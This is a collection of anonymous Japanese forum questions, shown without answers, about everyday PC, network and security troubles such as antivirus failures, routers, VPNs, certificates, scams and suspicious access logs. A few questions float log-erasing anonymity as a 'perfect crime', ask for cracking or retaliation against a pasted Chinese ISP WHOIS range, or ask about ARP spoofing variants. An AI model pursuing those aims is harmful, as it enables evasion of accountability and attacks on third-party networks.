生駒と申します。お世話になります。 私は、こう考えました。 どんな国の匿名串を多段で通したとしても ログが残っていたら、身元は、ばれますね。 でも、自宅に匿名プロキシサーバーを置いて そこに刺して、ログ消しちゃえば完全犯罪が 可能なのではないでしょうか？　＾＾ いや、悪意がある訳ではないのですが、 興味本位で質問させて頂いておりますので その点、ご了承下さいませ。 宜しくお願い致します。
パソコンノートで今でもＸＰを1台使用中です（バスタークラウドを入れていました）。ワイヤレスの変更（100Ｍｂ→1Ｇ）に変更したのでネット接続できなくなり、再セットアップしました（不要なものも多くこの際整理と言う事もあり）ネットは出来たのですが、ウィルスバスターをダウンロードしたのですが拒否され出来ません、Ｍａｋｆｅｅも無料体験しようとしましたがこれもダメで導入できませんでした。もうＸＰにはアンチウィルスを入れるのは無理、この辺で終了ですか？Ｖｉｓｔａなら可能なんでしょうか？
32万円支払って、教えていただいた教材がネットビジネスで誰でもできるような内容だったので、返還していただきたいのですが、できますか？ ネットビジネス関係だと厳しいと聞くのですが… 相手側には情報を既に提供してるのでできない。と言われています。 ちなみに私は未成年で、消費者センターには未成年者契約取り消し法？というやつで、相手がなに言おうと取り消し可能と言われました。 ハガキを送って様子見てるのですが、相手が行動してくれないのであれば、会社に直接言って説得するというかたちで進んでいます。 なにか、情報があれば教えてください‼︎
NTTファイナンスの奴なんですが PC代を 5月分と4月分を払い忘れてて契約解除予告書来てるのですが どう払えばいいのかわからないです コンビニで一度 そのはがきを渡したのですが払えませんと断られて どううればいいのでしょうか？？ 詳しい方 よろしくお願いします 請求書はないんで支払いしようにもできない状態です(探してる途中ですが)
Windows7(他OSでも可)に標準で付いているリモートデスクトップ接続を使って、 出先から自宅のPCにアクセスしたときの事について質問させてください。 ローカルPC上のファイル(例えばsample.xlsx)を右クリックコピーして、リモートPCのデスクトップ上で貼り付け、 またリモートPC上のファイルをコピーして、ローカルPCのデスクトップ上に貼り付け、 すなわちクリップボードを介してファイルのやり取りをした時の脆弱性についてご存知の方いませんか？ また、出先のネットワークのルータを必ず通り、自宅のルータを通ってリモートPCに運ばれると思いますが、 ルータのログ等で情報はどこまで知る(知られる)事が可能なのでしょうか？ 更に、リモートPC上で重要なデータを開いた場合、ローカルPC上では画面転送にて閲覧できていますが、 そこに重要なデータの流出の危険性はあるのでしょうか？ 画像データのやり取りなのでその瞬間の画面は取得可能だとしてもファイルの内部を搾取される可能性はないと予想してますが正しいでしょうか。 以上、技術的に詳しい方の知見をお聞きできれば幸いです。
サイトを見てると、この指示がでてきて画面が暗くなって、先にすすめなくなります。 いつも更新してください。と言ってきます。Oracle Ameica. Inc. でパソコンの修復をするとかなんとか、 見ると、ここにアクセスすると、全ての情報が公にさらされると書いてあるので こわくてできません。 しなければならないのでしょうか。
全くパソコンの知識がないのでお伺いさせていただきます。 会社のパソコンですが昨日は普通にインターネットも含め使用できていたのですが本日回もでパソコンを開いたところインターネットに接続出来ませんでした… なんとなくあちこち開いて原因をさがしてみたところDNSサーバーに問題があると出てきたんですが、何が原因でこのようになってしまったのでしょうか？ あとインターネットの回線自体は他のパソコンを繋いだところ普通に使用出来ました‼ 私のパソコン自体に何らかの問題があるかと思います… 詳しい方がいらしゃいましたら簡単に教えて頂けたらと思います！知識がないのでよろしくお願いいたします‼
win８で、プリントパックのofficeprintというアプリ http://www.printpac.co.jp/contents/office/howto. … を使いたいのですが、ダウンロードまでは出来るのですが、 インストールしようとすると、インストール画面は出て、完了までいっても、 PC内のどこにもアプリが見当たらないです。 これって、インストールできていないということですよね？どうしたら使えるようになりますか？ PCのセキュリティとかの問題なのでしょうか。
画像のように電源は落ちてないのですが、各ネットワークが勝手にオフラインになって しまいます。以前まではこのような状況はほぼなかったのですが、最近は けっこうな頻度でなります。 共有フォルダを置いているＰＣがこのような状況になると非常にめんどくさくなるので なんとかしたいのですが、設定とかで改善できるでしょうか？
社内で利用するプロキシサーバーの隠蔽機能がよくわかりません。 インターネットに出る時のIPアドレスを隠すことが出来るみたいでが(squidのforwarded_forはoffにしてる) インターネットに出る時はFWに設定するグローバルIPアドレスでインターネット上のサーバーにアクセスするので、プロキシで隠蔽してもIPアドレスの隠蔽にはならないのではないですか？ 別にブラウザにくっついて出る情報はローカルのプライベートIPアドレスが出るわけでもないのに、出てもホスト名だけですよね？ プロキシサーバーを使う時と使わない時のセキュリティ差が変わりません。教えてください。 キャッシュやフィルターなどで必要なことはわかりました。 プロキシの設定によっては、アクセス元の情報も出さなければ、自身の情報も全く出さない
検索しましたが同様の情報は得られなかったので、質問させていただきます。 現在サイトを運営しているのですが、アクセスログを見たところタイトルの通り自分のipで覚えのないアクセスが記録されておりました。数日前にサイトを更新した際のipと同じなので自分のものであることは間違いないと思います。 家族が同じ回線でPCを使ってはいるのですが、記録されている時間は誰も家にいませんでしたし、PCを持って外出した人もいません。私はその時刻PCを使ってはいましたが、もちろんアクセスはしていませんし、ブラウザの履歴にも記録はありません。 また、リンクなどに登録する際はバナーもアップロードしているのですが、記録されたアクセスはバナーを介さず直接URLを指定したものでした。初めにトップページやインデックスではなく、コンテンツにアクセスしているところも不思議です。そしてサイト内のページを閲覧する速度も非常に速く、まるでロボットのような動きです。 ftpソフトから確認したところ、幸いコンテンツの改ざんなどは見られませんでした。ウイルス感染も疑いましたが、対策ソフトは正常ですし、PC自体に異常な動きもありません。 無料サーバーで運営しているのでサーバー側の不具合かとも思ったのですが、情報は見られませんでした。 他に原因が見られず数日様子を見て変わらないようならサーバーの管理者の方に問い合わせようと思うのですが、もし出来ることがあれば対策いたします。詳しい方や同じような体験をしたという方がいましたらご教示いただければ幸いです。何卒よろしくお願い申し上げます。
東芝のダイナブックを所有しており、基盤の故障らしく東芝ＰＣサポートに修理に出します。初めて修理に出すので、パソコン内のデータが漏えいしないか心配です。東芝さんに修理に出すので大丈夫だと思うのですが、どうでしょうか
タブレットにGoogle拡張機能をインストールさせたいのですが、どなたかいい方法はしりませんか？
インターネットに繋げていると知らない画面が突然ポップアップしてくる。ウィルススキャンしても問題ないと出る。
インターネットで検索フォームに入れた言葉の予測を消したいです。 過去に検索した言葉が、一文字入力すると出てきたり 個人名も出てきます。 ほかの人が使ったときに見られると少し気まずいので 出ないようにしたいのですが方法がわかりません。 たとえば… 「佐藤」と入れると過去に検索した佐藤〇〇さん（芸能人の名前）と 佐藤〇〇（個人名）が出てきてしまいます。サイト名も同じです。 削除方法、教えていただけたらと思います。 よろしくお願いいたします。
中経出版のHPで単語帳の音声をダウンロードしようとしてダウンロードボタンを押したのですが、Windowsセキュリティというのが出てきて、ユーザー名とパスワードを入れて下さいと書かれています。これは何のユーザー名とパスワードを入力すればいいのでしょうか？
リンクを繰り返してアダルトサイトに入ってしまったのですが、動画再生ボタンを押したら料金請求のページに行ってしまいました！ ご作動登録の場合はこちらの電話番号に24時間以内にご連絡してください。 24時間後は料金を支払いしていただきます。 と書かれていたのですが焦ってそのページを消してしまって連絡先を覚えていません！ こういう場合どうすればいいでしょうか？
お世話になっております。 例えばフィリピンからのWEB閲覧を早くしたい場合、 フィリピンにサーバーを置けば早くなると思いますが それ以外に仮想でフィリピンにサーバーを置いているように することはできるのでしょうか？？ その他、アジア圏で安く安全にレンタルできるサーバー（共用でOK） を知っている方が居たらお教えください DreamHostやBlueHostはアメリカ圏なので無理です AWSでも月々3000円くらいなのでそれ以下に抑えたいと考えております。
下記の文書は、何語で書かれているのか分かりませんが、この外国語で書かれている文書はキーボードのバックスペースキーやデリートキーで消そうとしてもカーソルが誤作動を起こしたように動きます。 また、矢印キーも誤作動を起こしたように動きます。 何故そうなるのか、その理由が分かる人がいれば教えてください。 این مساله که شما تازه از سر کار برگشته‌اید ویا خسته از کارهای
素人的な考えかもしれませんが、ウイルスを使ってIDやパスワードを盗まれても、乱数表はパソコンには保存されていないはずなので盗みようがないのではなかと思います。 もちろん過去に使用した4ケタの履歴は残っているかもしれませんが、その4ケタの数字は毎回かわるので、連数表がないと最終的に不正送金できないのではないかと思います。 それから、ネット銀行に預けている定期預金などが不正に盗まれた場合、銀行は補償してくれる のでしょうか。
ウイルスバスターのエラーについてです。 助けてください。 2日ほどまえに、ウイルスバスターが自動でスキャンをかけて、システムチューニングをしました。 その後から、起動する時に「UtilJ sonHandle.dllがないため、プログラムが〜」 と出るようになってしまいました。 最初はよくわからなかったので、調べてみたところウイルスバスターのファイルだということが分かったので、アンインストールして、もう一回インストールしたら治るかと思いやってみましたがインストールの途中で失敗してしまいました。 エラーコードも、0#,0,0×000000.0と、 検索してもヒットしないエラーコードでした。 消しが甘かったのかと、プログラムファイルのトレンドマイクロを消してまたインストールしてみましたがこれも駄目。。。 機械に任せてみようと、 「IObit Uninstaller」というアンインストールツールでアンインストール後、アンインストール仕切れていないファイルが見つかったらしいので全選択して一括削除。 これはいっただろうと思いもう一度インストールしてみますがまた駄目。。。 もう僕に出来ることはやり尽くしました。。。 他に何か出来ることは無いでしょうか？ または、治すにはどうしたらいいのでしょうか？ または、最終的にはどこに聞けばいいのでしょうか？ なにか分かる方、いらっしゃいましたら教えていただけると幸いです。
携帯の基地局１つあたりのトラフィック上限値は何Gbpsなのでしょうか？ キャリアや3G/4Gなどの違いによって差はあると思うのですが、 光ケーブルを通してキャリアのネットワークにつないでいるのであれば 1G/10Gbpsといった単位になるのでしょうか？ もし公開されてる情報があれば教えてほしいです。
1日70万アクセスあるWebサイトのサーバーを自宅に移設する事になりました。 現在は下記の２台構成で運用しています。 Ciscoルーター 　│ 　│NIC1 Webサーバー 　│NIC2 　│ DBサーバー そして、自宅に運ぶのは「Webサーバー」と「DBサーバー」のみです。 ルーターはこちらで用意するか、今ある物を使う事になります。 今あるルーターはNTTからレンタルしているPR-500MIと 暫く使っていないNECのWR8700Nです。 回線はフレッツ 光ネクスト ギガファミリー・スマートタイプで、 http://www.nuro.jp/speedup/ こちらで測定した実測値は、下り上り600Mbps程度あります。 「とくとくBB」でサーバー用に固定IPを取得しました。 PR-500MIに、 普段インターネットする用の「Asahi ネット」(動的IP)と、 サーバー用の「とくとくBB」(固定IP)のアカウントを設定し、 どちらも有効になっています。 テストサーバーを用意し、 固定IPで外部からテストサーバーにアクセスできる状態になっているのも確認できました。 あとは本番サーバーを車で運んできて、 ルーターに繋ぎ、DNSのIPを変更すればOKか？、、、 という状況です。 しかし、、 果たして、PR-500MIが1日70万アクセスの負荷に耐える事が出来るのか、 そこが不安です。 1アクセスで転送されるデータ量は平均300KB程度で、 大きくても6MB以下で98％です。 負荷のピークはお昼12時台で10分間に７０００アクセス程度です。 PR-500MI(ルーター)のセキュリティ設定はデフォルトです。 ルーターの仕様やスペックなどから、 どの程度の負荷まで耐えられるのか目安を知る方法はありませんか？ アクセスは全盛期で３倍(210万pv/1日)ありましたので、余力も確保しておきたいところです。 ルーターに詳しい方からのご意見とアドバイスを頂きたいです。 宜しくお願い致します。
LINEで必要以外につながりたくないので友だち追加も友だちへの追加を許可もオフにしています。メールアドレスしかつながりのない知人が最近LINEをはじめ、知りあいかも？に現れました。オフにしているのに、なぜ、相手は友だち登録できたのでしょうか？相手はこちらの電話番号知りません。二人ともiPhone使用です。
インターネットエクスブローラが停止しました。というメッセージが出ますが、ネットは相変わらずつながっている。何か悪いのでしょうか？ ウィンドウズ8.1使用
1. サーバサイドでsecureを指定した場合は https経由での通信時のみ暗号化されたstorageに内容が保存される という理解であっていますでしょうか？ "暗号化されたstorage"という箇所はおそらくブラウザの実装次第なのだとは思われますが、 モダンなブラウザを使用する分には気にしなくてもよいでしょうか？ 2. セッションIDをcookieに保存しているケースはよくあると思いますが、 ブラウザのデベロッパツールなどを用いて ユーザ自身がセッションIDの中身を閲覧できる事自体がセキュリティの問題になるケースは存在しうるのでしょうか？ 第三者ではなくユーザ自身がその行為を行うこと自体はしかたのないこと＆ 防ぐ手段が思いつかないのですが、 何かしらの有効な対策があるとすれば教えていただきたいです。 cookie名をわかりづらくするぐらいしか思いつきませんでしたが、 根本的な解決方法ではないのであまり効果はなさそうです。
1ヶ月前にYAMAHA RTX1200を新しく購入しました。webでは全てppp認証での接続例が掲載していて、サポートに確認したところ自分でconfigを作成してある程度出来た所でないとこちらでは接続に対しては教えられないとの事でした。通信に対してのノウハウが無いためこちらのサイトでご質問させていただきました。 VPN接続は、自宅と会社で　自宅はケーブルTVのモデムに接続してあるルーターにつないだMacbookProからIPsecで接続したいです。 会社は5つ固定IPのうちの一つを静的NAT交換したローカルIPアドレス192.168.0.100（またはグローバルIPの一つ）をYAMAHA RTX1200のLAN2に割り当て、LAN1に192.168.1.100を割り当て社内LANにつなぎたいです。
maillogを見ると 『mail dovecot: pop3-login: Aborted login (auth failed, 1 attempts): user=<noah>, method=PLAIN, rip=xxx.xxx.xxx.xxx lip=xxx.xxx.xxx.xxx』 上記のログが大量に出力されている状態を発見しました。 dovecotに対する辞書攻撃のようですが、 防御法はどのようなものがありますでしょうか。 ご存知の方、アドバイスをお願いします。
PCとクラウドサーバの考え方はとにかくPCの中の特定のフォルダ構造の内容がそっくりクラウドサーバに保存され、他のPCでも設定すればそのPCのフォルダにそのフォルダ構造がコピーされるということだろうと思います。なるほど、大変便利なのですが、以下のような質問があります。 １．複数のPC、クラウドで同じフォルダ構造になるように調整されるとした場合、1つのPCが長期間電源をいれておらず、足並みをそろえることが遅れた場合、古い方が新しい設定だとクラウドが思い込んで全部が古い状態に戻るということはあり得ないのでしょうか。端的にいうと、あるPCに特定のファイルがないという状態がある場合、”ユーザーによって能動的に削除されたのか（サーバにはあるが削除）”、”あるはずなのにない（従ってクラウドからコピー）”のかが判別されるのかという問題です。ここがはっきりしないと安心できない感じがあるのですが。 ２．このような使い方はまるでフォルダ共有と同じです。クラウドとは大規模で安全なフォルダ共有ということなのでしょうか。 よろしくお願いします。
メールの添付ファイルを開くのではなく、メールそのものを開いただけで感染する悪意のウイルスは存在するのでしょうか？ご教示いただけましたら幸いです。よろしくお願い申し上げます。
会社で無線LANの導入を検討しています。 機器の構成内にL3スイッチを含めようか迷っています。 ちなみにネットワークは中級者程度の知識（のつもり）です。 無線LANはSSIDタグ付けのVLANを3つ持ち、 そのうち2つはRADIUS認証させます（VLAN 100,200）。 VLANの1つはインターネットへ抜けるだけのWEP2認証です（VLAN300）。 L2スイッチは機器構成に入れており、社内NWへVLAN接続します。 RADIUS認証させるVLAN100・200は、とりあえず今のところ相互接続する予定はありません。 ただし将来的にはわかりません。 無線LANの用途は社内イントラへの接続（VLAN100・200）と、来客用（VLAN300）です。 IP電話用途は将来的にはありえます。 試験導入ですので、しばらくは無線LAN端末もどの程度社内で使用されるか見えていません。 L3スイッチの意義が今ひとつよく理解できていませんが、 将来的にVLAN100・200の相互接続が必要になったら、 ルータを追加し、さらにルータでは処理的に間に合わないほどWiFI端末が多くなってきたら L3スイッチを追加で購入。 のような形で考えているのですがどうでしょうか？
先日、いわゆるオレオレルート証明書をインストールしてしまうマルウェアが発見されたというニュースを見たとき、このオレオレ認証局に署名されたEV-SSLサーバ証明書を勝手に発行することが可能になってしまうのだろうかと疑問に思いました。 そのニュースは、ネットバンキングに対する中間者攻撃を狙うマルウェアの記事で、正常な状態ではEV-SSLサーバ証明書により本物と偽物の見分けが付く（アドレスバーが緑色になるため）と言っていましたが、一般的な話として、ルート証明書が偽装された段階でも、EV-SSLサーバ証明書というものは絶対に偽装されないものなのでしょうか。 自分なりに調べた結果、通常のSSLサーバ証明書とEV-SSLサーバ証明書の違いは、手続き上では、認証局による証明書発行の際の認証手順と、具体的な証明書の違いとしては、あらかじめ認証局が決めたEV-SSL証明書用の識別子の有無、ということだと理解しました。 それでは、偽のサーバ証明書内に、本物の認証局が用いるEV-SSL証明書用の識別子を付加して、先のオレオレ認証局に署名させれば、上記の類のマルウェアにより偽のEV-SSLサーバ証明書を持つサーバを偽装できてしまいそうですが、実際にはどうでしょうか？ それとも、EV-SSL証明書用の識別子と正規のルート証明書の対応付け等、ブラウザによる何か強固な仕組みがあるのでしょうか？
一定時間ごとに画面右下に10x10mmくらいの面積で出ます。 使用無料ではありますが、 消すにはｘが小さすぎてmousepointerがずれてうまくclickできぬことで感じ悪いし、 では 表示されても視線を外せば良いからとふつうあまり邪魔にならぬ左方へdragしようとしたが 動かせませんので作業fileの邪魔です。 上記２点の解決法が有ればよろしく。
パソコンのセキュリティソフトから「アプリケーションnzsess.exeをブロックしました」のメッセージ（下記参照願います）が出ました。 この「nzsess.exe」は、パソコンのウイルスなのてしょうか。 それとも、何か、別のソフトでょうか。 よく分からないので、お教え願います。
最近メールが届かないことが多く、サーバーに確認したところ以下の返事が返ってきました。 「お客様御利用の共用サーバーにてスパム発信があり、それにより、ブロックリストに掲載されている状態でございました。 弊社にて、スパム発信の方停止措置を行いまして、ブロック解除申請をさせていただいております。」 どうしてそうなったかを聞くと、この度のスパム発信につきましては、共用サーバー内の別ユーザーに因るものとなりますので、お客様の御利用に問題があったものではありません。」 とのことでした。 サーバーではこういうことはよくあることなのでしょうか？ここのサーバーは良いサーバーでしょうか？パソコンのメカニックなことは全く分からないので、わかる方がいましたら、教えてください。 よろしくお願いいたします。
会社のオフィスにFortiGateのFortiGate30Dの導入を検討しています。 現在ブロードバンドルーターを使用しており、それなりにファイアウォール機能 がついているのですが、もうワンランク上の機器でセキュリティ対策をと思っていますが、導入について・・・それほど知識がなくても大丈夫でしょうか？ おすすめのショップなど教えて頂ければ幸いです。 よろしくお願いします。
ARPスプーフィングは一般的に、ゲートウェイ(ルータ)とターゲットのＰＣのARPテーブルを両方書き変えるという手法が取られると思いますが、ターゲットのARPテーブルは一切変更せずに、ルータのテーブルのみ変更(ターゲットのMACアドレスを自分のものに変更)という手法をとられることは無いのですか？
メールや個人情報などが入力されているページをログアウトしないで数種類の無線LANに繋いだり切断したりを繰り返していたら問題発生しますか? たとえば、朝にスポットAでネットワークに接続してログインする→ログアウトしないでネットワークから切断される→夕方、スポットBでネットワークに接続→ログアウトしないでネットワークから切断→3日後、スポットCでネットワークに接続です。
クラックとかやり返しの方法あったら教えて下さい。 inetnum: 222.64.0.0 - 222.73.255.255 netname: CHINANET-SH descr: CHINANET shanghai province network descr: China Telecom descr: No1,jin-rong Street descr: Beijing 100032 country: CN admin-c: CH93-AP tech-c: XI5-AP changed: hm-changed@apnic.net 20031024 mnt-by: APNIC-HM mnt-lower: MAINT-CHINANET-SH mnt-routes: MAINT-CHINANET-SH remarks: This object can only modify by APNIC hostmaster remarks: If you wish to modify this object details please remarks: send email to hostmaster@apnic.net with your remarks: organisation account name in the subject line. status: ALLOCATED PORTABLE source: APNIC person: Chinanet Hostmaster nic-hdl: CH93-AP e-mail: anti-spam@ns.chinanet.cn.net address: No.31 ,jingrong street,beijing address: 100032 phone: +86-10-58501724 fax-no: +86-10-58501724 country: CN changed: dingsy@cndata.com 20070416 changed: zhengzm@gsta.com 20140227 mnt-by: MAINT-CHINANET source: APNIC person: Wu Xiao Li address: Room 805,61 North Si Chuan Road,Shanghai,200085,PRC country: CN phone: +86-21-63630562 fax-no: +86-21-63630566 e-mail: ipms@shtel.com.cn nic-hdl: XI5-AP mnt-by: MAINT-CHINANET-SH changed: ip-admin@mail.online.sh.cn 20010510 changed: zhengzm@gsta.com 20140227 abuse-mailbox: ip-admin@mail.online.sh.cn source: APNIC
A社のネットワークサービスはB社の共同型システムで運用し、セキュリティ向上のためＢ社のセキュリティシステム（合言葉による認証）を採用しています。 顧客Ｃさん（夫）は夫婦でA社のサービスを自宅のパソコン（Windows7とWindows8の２台を夫婦で共有）から利用しています。 Ｃさんは夫婦で共有するパソコンから利用しているので、リスク評価は同レベルであり、多少の利用頻度の違いがあっても同程度の合言葉の入力要求があるなら納得できるがCさんの方に入力要求が多いのはなぜか？との質問をA社にしました。 A社はCさんの質問をB社に取り次ぎ、 Ｂ社の回答内容（IPアドレス、パソコンOS、ブラウザ等の変化を総合的に判断して、合言葉の入力を要求してる。セキュリティに関することなので詳しく開示することはできない。）を説明しました。 Cさんは納得できないと、 今度は普段使っていないWindowsＸＰから利用した。リスクは大きくなったのに夫婦とも合言葉の要求が出ないのはなぜか？と質問をしました。 このような場合 A社はB社のセキュリティシステムをどの程度説明する責任があるのでしょうか？ B社はセキュリティに関することなのでと明確な回答を行なっていませんが、B社の対応はこれ以上する必要はないのでしょうか？ もしくは、Ｃさんの説明要求が過剰なのでしょうか？
社内での不正アクセスに困っています。 現在、会社でエクセルを使用してデータを作り、オンライン上のデータの倉庫へ載せる仕事をしております。パソコンは会社にもあるのですが、私は自分のノートパソコンを持っていって使用しています。 ノートパソコンは会社でしか使用していません。 セキュリティソフトはノートンを入れており、不正アクセス防止のために、ブルートゥースは削除して、wifiなどもオフにして、１週間に一度は再セットアップしています。 今日は、オフにしていたwifiが終業時には、なぜかオンになっており(パソコンに触った人はいません)、イベントビューアーで確認すると、レジストリを書き換えられていたり、エクセルが起動しなくなったり、ファイルが保存できなくなったりしました。 こんなことが出来るのは、１人しかおらず、依然、ネットワーク関係の会社に勤務していた上司しかいません。 上司はサーバーの管理者権限も持っており、私では太刀打ちできません。 ちょっと調べてみたのですが、ハードウェアの暗号化なんてのは役にたつものでしょうか。 セキュリティ関係の事情に詳しい方、いらっしゃいましたら、何か上手い方法がありましたら、ご教授願えませんでしょうか。
リモートアクセスを利用したいのですが？？ポート設定がしていないか？分かりませんが、特定ポートからＬＡＮＤＩＳＫにアクセスする事が出来ません。ブラウザ上で設定したいのですが設定方法が分かりません。どなたか教えてもらえませんか？
2003server と　windows7 を繋げていました。 ワークグループです。 2台のpc を初期化しました。Pingは、お互いに通っています。 Windows7から2003serverに、アクセスしようとすると、 「アクセス許可がない可能性があります」と、はじかれてしまいます。 2003serverの設定の問題だと思いますが、解りません。 お恥ずかしい話ですが、何方か教えて下さい。 宜しくお願い致します。
webサイト等でログインに必要なIDとパスワードどのように管理されていますか？ たくさんあると記憶が出来ないですし、サイトによって使える文字、記号、文字数が違うので一つに 統一する事も出来ません。 皆さんはどういった方法で管理されていますか？
最近DOS？をされてます DOSをされるとネットが落ちてしまい困ってます 対策を教えてください https://mega.co.nz/#!TxUVTY5B!XhEjNF3vsEp7q6ZjNB … ↑パケット情報のファイルです できれば ネットとかに関する知識もほしいので解説もお願いします 無くてもいいです 他に必要の情報等がありましたら教えてください。
ネットバンキングの危険予知のためにPHishwallを使っていますが、 IEが途中で応答しなくなることが多くなりました。 できればマカフィーに変えたいと思っていますが、マカフィーの 評価をどうなんでしょうか？
お恥ずかしい話なのですが、アダルトサイトを、クリックしたら、「登録されました。削除するには、下記へ電話ください。」とメッセージ。閉じても、何分かおきに、小さい画面が現れるようになりました。再起動しても駄目です。ウイルスセキュリティゼロは、入ってるんですが・・・画面を消す方法が解る方いらしたら、教えて下さい。電話をすれば、相手の思う壺でしょうし・・　よろしくお願い致します。
HWD15について困っています。 職業柄外でPCを使うので用いているのですが今日突然通信が出来なくなってしまいました。 電波が悪いわけでもなくwimax2プラスやwimaxの電波は全部立っている状態なのに接続してから通信してくれません。PCの故障かとも思いましたが家で普通にネットにつなぐことが出来ました。 オールリセットやクイック起動オフでの再起動など出来そうなことはしてみたのですがいっこうに改善されません。 オンラインアップデートの関係かな？とも考えたのですが更新も出来ませんこれも気になるとこの一つですね。 auに相談しようにも時間外ですし明日の朝一に使うことがあるのでaushopに持って行くこともままなりません。 何とかならないでしょうか？
昔、同一ＷＥＢサーバー上にある、下部にぶら下っているＨＰアドレスを表示できるコマンドがあったような気がしましたが、ありませんでしたっけ？ 例えば， http://www.test.co.jp/test というHPがあり、下部に http://www.test.co.jp/test/test1 といったHPが下部にあり、そのアドレスを表示できるコマンドって有りませんでした？
でもoutlookメールが変なんです。どうしたらいいでしょうか？ ■windows８の場合 windows８のPCでoutlookを開いてメールを閲覧しても、windows７のPCには、同じメールの受信・発信が見れます(受信発信の履歴が残っています)。これがいいのです。 ■windows 7の場合 しかし、windows ７のPCでoutlookの受信発信を見た後では、どういうわけか、Windows８のPCのoutlookには、その履歴が残っていません。表示されません。これは不都合なのです。 わたしとしては、windows８outlookを開いても、windows７でoutlookを開いても、どちらの PCにも、同じメールが残っているほうがありがたいのです。 windows８のPCをどのように設定すれば、windows７で閲覧した同じメールがwindows８のPC でも見ることができるのでしょうか？ よろししくお願いします。
Superfish の電子メール版はあるのでしょうか？ もちろん名前は、別のものでしょう。 これがあると、SSL通信での、通信経路での安全性も、怪しくなると思います。 どの時点で、何を調べたら、入っているかいないかが、判断できるのでしょうか？ また、どんな対策が考えられますか？ よろしくお願いします。
あまりにもこの録画君、監視君のアプリを利用する人が多くて実際に見てくれている人数がわからないし、トークするのが怖く感じています。今の現状20人録画をしていて実際見てくれている人が5人くらいしかいなくてツイキャスで配信するのが少し怖くて最近あまり配信ができません。 このアプリを少しでも起動させないようにするとか認知させないで配信する方法とかありませんか？ だれか助けて下さい。この質問は青少年犯罪法とかにも少しでもならないようにする質問になると思います。
あるソフトのバージョンアップを管理者工数削減のため、ユーザーにログオンしてもらいユーザーに作業を行って貰っているのですが、途中で管理者の認証を聞かれる画面が表示されます。 対象PCは複数台あるので、管理者が認証情報を入力しなくともユーザーだけでその作業を完了させる方法はないでしょうか。パスワードを自動的に入力できるようなソフトを使ったとしても、この作業以外では使えないようにさせたいのです。　 PCはwindows７です。
今晩は、Win 8.1です、宜しくお願いします。 コマンドプロンプトから「IPConfig　/All」を打ち込むと ・Wireless LAN adapter ローカル エリア接続* 14: ・Wireless LAN adapter ローカル エリア接続* 2: ・イーサネット アダプター ローカル エリア接続: ・Wireless LAN adapter Wi-Fi: とアダプターが表示されました。 ・ローカル エリア接続が何故２個あるのでしょうか。 ・ローカル エリア接続の後にある数字「１４」とか「２」とかはどのような意味でしょうか。 ・「イーサネット アダプター ローカル エリア接続」と「Wireless LAN adapter Wi-Fi」 の意味の違いはどのようなものでしょうか。 以上宜しくお願いいたします。
アプリ連携に偽じゃねったとあります。 誰か開発者、管理者がいるのですか？
Windows7を使っています。ルーターのARPテーブルを静的に変更したいのですが、 ルーターのARPテーブルはどうやって確認できますか？ （ルーターの機能を見てみたところ、ARPテーブルを確認する機能はありませんでした。 「ポートマッピング(固定的に使用するポート番号とＰＣを結びつける)」という機能は あるようですがこれは関係ないですか？
社内にて、サーバーPCをメインに、ファイル等をネットワークで共有をかけています。しかし、何台かのPCだけ、ネットワークのメインPCのアイコンが出て来ずに、不便しています。 改善策として、IPを固定・ワークグループの設定(名前をWORKGROUPに直した)をしてみました。 が、未だ共有ネットワークへは入れず、他質問サイト等を徘徊してみまして、足りていないものがないかを確認しましたが、ダメでした。 アドバイスを頂いている社内の人間からは、これでダメなら、ネットへの接続方法自体がメインPCと異なっている場合があるという返答をもらい、それっきり返信がなく、手詰まりです。 ※因みに使用PCはWindow7になります。 お知恵を貸して頂きたく思います。 宜しくお願い致します。
日立電線ネットワーク社の apresia を初期化したいのですが パスワードと初期化のパラメタがわかりません。。。。 ご教授よろしくお願いいたします。 正式機種名は Apresia3124GT2 です。
Visual Discovery について、 詳しく解説しているサイトを教えて下さい。 これだと、SSL通信が、中間者攻撃を受けると言うことなのでしょうか？ いま、レノボのPCを買えば、入っているものが買えるのでしょうか？ よろしくお願いします。
初歩的な質問で恐縮です。 PC10台程度の小規模のLANがあります。 ルータとハブの間に、ネットワーク中継しているPC（LANカードが2枚刺さっている）があり、 このPCにはNortonやカスペルスキーといったセキュリティソフトを入れています （いろいろなのを試したいので更新が来るたびに変えています）。 ハブの内側にあるLAN内の各PCにはWindowsDefenderのような かんたんなウイルスチェックソフトが入っています。 中継PCで行われているセキュリティチェックは、 ただ中継しているだけの通信も全部チェックしていると考えてよいのでしょうか。 おそらく、この中継PCがあるせいで、なんだか通信が重たいのです。 無いよりはマシだろうと、環境を引き継いだままその構成で運用しているのですが もし一部しかチェックしていなかったり、全部素通りしているようであれば 中継PCは取っ払ってしまって、LAN内各PCのセキュリティ対策を あげようかとも考えているのですが。。
下記のサイトの手順で、ポート開放を行っていたのですが、 「ブロードバンドルータのポート解放方法 」の管理画面で、ログインできなくなります。 このままではポート開放ができないので、どなたか他の方法を教えてもらえませんか・・・？おねがいします・・・。 インターネット環境は、有線LANを壁の凸穴コンセント？に繋いでつかっています。 http://www.geocities.jp/seidy_seidy/bb/port.html
最近、教えてgoo を見ているときに限って、 IE　が停止するのですが、 原因は何でしょうか？？ よろしくお願いします。
VPN接続についてなのですが VPNで繋げるとIPアドレスなどが追跡されないと書いてあったのですがそれは本当なのか教えて下さい
こんにちは＾＾ まずはOKWaveからの質問方法を聞きたくなりますね(^。^;) どうやって質問をするのか、わけがわからない（相当大昔ですがそのころからにくらべてややこしい） （笑）それでgooさんからの質問としました。 失礼しましたm(_ _)m マイコンピュータを開くと緑バーが左から右へ流れていくのですが これがすごく時間がかかり非常に困っています。 ウインドウズ7からの機能？ そして右に走り終えて、そこからHDDやメモリーカードを開こうとするとフリーズする始末。 もうたちが悪い大きなお世話なのかなって？ だいたい、これがなんのためにあるのかさえわからないまま使わざるを得ない状況に困惑しています。 ウインドウズXPの時にはなかったけど、7になって知りました。 前から気にはなっていましたが、今日は特にフリーズ状況がひどい(T_T) スペック的に問題はないと思うのですが Windows 7 Professional システム メモリの合計 8.00 GB RAM システムの種類 64 ビット オペレーティング システム コア プロセッサの数 2 このバーはなんのために実装されたんでしょうか？ また、常時このバーが作動しないように出来るのでしょうか？ また、そうした場合に起こるデメリット花んでしょうか？ Aaroだったかな？それがバッググランドで動いているのかな？それが邪魔してるとかあるのかな？ ウインドウズ2000とXPが一番良かったなぁー！ (ヽ´ω`)ﾊｧ…
